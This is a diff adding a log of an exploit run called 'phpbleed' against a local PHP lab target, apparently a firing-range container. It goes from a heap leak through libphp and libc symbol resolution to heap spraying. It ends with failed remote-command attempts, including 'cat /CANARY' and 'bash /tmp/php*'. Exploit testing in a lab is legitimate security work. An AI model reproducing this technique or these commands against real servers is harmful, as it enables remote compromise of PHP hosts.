@@ -1,0 +1,101 @@
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8088/index.php
+============================================================
+16:51:26Z === phpbleed run start (fresh=False) target 127.0.0.1:8088/index.php ===
+
+[Phase R-1] Heap leak
+16:51:26Z [R-1] heap_ref = 0xfaf9a3c57220 (reqs=1)
+  heap_ref = 0xfaf9a3c57220
+
+[Phase R-2] Finding libphp.so
+  ELF @ 0xfaf9a3e00000 phnum=9 (4 reqs)
+  ELF @ 0xfaf9a5400000 phnum=9 (26 reqs)
+  ELF @ 0xfaf9a0600000 phnum=8 (57 reqs)
+  Fine-grained scan near 0xfaf9a3e00000
+  ELF @ 0xfaf9a3700000 phnum=9 (520 reqs)
+  ELF @ 0xfaf9a4b00000 phnum=9 (565 reqs)
+  ELF @ 0xfaf9a5700000 phnum=9 (576 reqs)
+16:54:24Z [R-2] elf candidates: [('0xfaf9a3e00000', 9), ('0xfaf9a5400000', 9), ('0xfaf9a3700000', 9), ('0xfaf9a4b00000', 9), ('0xfaf9a5700000', 9), ('0xfaf9a0600000', 8)] (reqs=608)
+
+[Phase R-3] Resolving symbols via .gnu_hash
+  Trying ELF @ 0xfaf9a3e00000 (phnum=9)
+    symbol resolution failed at 0xfaf9a3e00000
+  Trying ELF @ 0xfaf9a5400000 (phnum=9)
+    symbol resolution failed at 0xfaf9a5400000
+  Trying ELF @ 0xfaf9a3700000 (phnum=9)
+    symbol 'executor_globals' not found at 0xfaf9a3700000
+  Trying ELF @ 0xfaf9a4b00000 (phnum=9)
+    symbol resolution failed at 0xfaf9a4b00000
+  Trying ELF @ 0xfaf9a5700000 (phnum=9)
+    symbol 'executor_globals' not found at 0xfaf9a5700000
+  Trying ELF @ 0xfaf9a0600000 (phnum=8)
+16:54:26Z [R-3] libphp=0xfaf9a0600000 executor_globals=0xfaf9a1d68a88 PLTGOT=0xfaf9a1c7ffe8 (reqs=636)
+  libphp           = 0xfaf9a0600000
+  executor_globals = 0xfaf9a1d68a88 (offset 0x1768a88)
+  PLTGOT           = 0xfaf9a1c7ffe8
+
+[Phase R-4] Libc discovery via GOT dump
+    PT_DYNAMIC @ 0xfaf9a1c7e0a8
+    .dynamic via anchor -0x8 (len=145596, got=1024b)
+    Reading GOT via DT_PLTRELSZ len=88392 (0x15948)
+    GOT read: len=88392, got 88392 bytes
+    External pointer groups: 25 total, 18 nearby
+    Trying nearby[0] = 0xfaf9a31f9864
+    Trying nearby[1] = 0xfaf9a3313430
+    Trying nearby[2] = 0xfaf9a3395244
+    Trying nearby[3] = 0xfaf9a341e4c4
+    Trying nearby[4] = 0xfaf9a374fcc0
+      ELF @ 0xfaf9a3700000 (phnum=9, est_off=0x4f000)
+    Trying nearby[5] = 0xfaf9a4b0170c
+      ELF @ 0xfaf9a4ab0000 (phnum=9, est_off=0x51000)
+      DSO @ 0xfaf9a4b00000 (phnum=9)
+    Trying nearby[6] = 0xfaf9a4bd0010
+    Trying nearby[7] = 0xfaf9a4c5dde0
+      ELF @ 0xfaf9a4be0000 (phnum=9, est_off=0x7d000)
+    Trying nearby[8] = 0xfaf9a4da126c
+    Trying nearby[9] = 0xfaf9a4eecd30
+      ELF @ 0xfaf9a4e90000 (phnum=9, est_off=0x5c000)
+    Trying nearby[10] = 0xfaf9a4fcfb84
+    Trying nearby[11] = 0xfaf9a5050348
+    Trying nearby[12] = 0xfaf9a51863f4
+      ELF @ 0xfaf9a5110000 (phnum=9, est_off=0x76000)
+    Trying nearby[13] = 0xfaf9a5472bc0
+      ELF @ 0xfaf9a5400000 (phnum=9, est_off=0x72000)
+      ELF @ 0xfaf9a5430000 (phnum=9, est_off=0x42000)
+    Trying nearby[14] = 0xfaf9a57729a0
+      ELF @ 0xfaf9a5700000 (phnum=9, est_off=0x72000)
+      ELF @ 0xfaf9a5750000 (phnum=13, est_off=0x22000)
+      libc @ 0xfaf9a5750000, system @ 0xfaf9a57992c0
+16:56:30Z [R-4] libc_base=0xfaf9a5750000 (reqs=2356)
+16:56:30Z [R-4] system() = 0xfaf9a57992c0 (reqs=2361)
+  system() = 0xfaf9a57992c0
+
+[Phase R-5] EG and stdClass class entry
+  EG @ 0xfaf9a1d68a88
+  anchor at EG+0x1b0: len=255
+    class_table = 0xbd10d5394bb0
+  class_table HT: nTableMask=-512 arData=0xbd10d5539f40 nUsed=256
+  stdclass ce = 0xbd10d546c6d0
+16:56:32Z [R-5] stdClass ce = 0xbd10d546c6d0 (reqs=2675)
+
+[Phase R-6] Spray slot discovery
+  chunk_base = 0xfaf9a3c00000
+  Bin-320 SRUN at page 117, free_count=0
+  Run start = 0xfaf9a3c75000
+  Found spray at slot 5 @ 0xfaf9a3c75640
+  S = 0xfaf9a3c75658
+16:56:32Z [R-6] S = 0xfaf9a3c75658 (reqs=2682)
+
+[Phase R-7] RCE trigger + canary exfil (no docroot write)
+16:56:33Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker crashed)
+16:56:33Z [R-7 cat-canary] cmd=b'cat /CANARY' -> NO RESPONSE (worker crashed)
+16:56:33Z [R-7 upload-exfil] cmd=b'bash /tmp/php*' multipart -> NO RESPONSE
+16:56:34Z [R-7 upload-exfil-sh] cmd=b'sh /tmp/php*' multipart -> NO RESPONSE
+16:56:34Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+
+  No flag in HTTP stream yet; check 'their channel':
+  docker logs --tail 50 php-firing-range-phpbleed-1
+
+[*] Total requests: 2686 (crashes: 1582)
